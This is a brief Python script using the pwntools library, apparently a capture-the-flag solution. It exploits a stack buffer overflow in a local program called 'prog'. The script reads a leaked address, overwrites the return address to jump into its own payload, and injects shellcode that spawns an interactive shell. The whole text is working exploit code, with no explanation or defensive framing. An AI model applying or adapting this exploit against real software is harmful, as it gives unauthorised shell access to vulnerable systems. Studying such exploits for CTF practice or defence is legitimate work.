from pwn import *

context.clear(arch='amd64')

p = process('./prog')

p.readuntil('at')
addr = int(p.readline(), 0)

payload = 'A'*9
payload += p64(addr + 9 + 8)
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
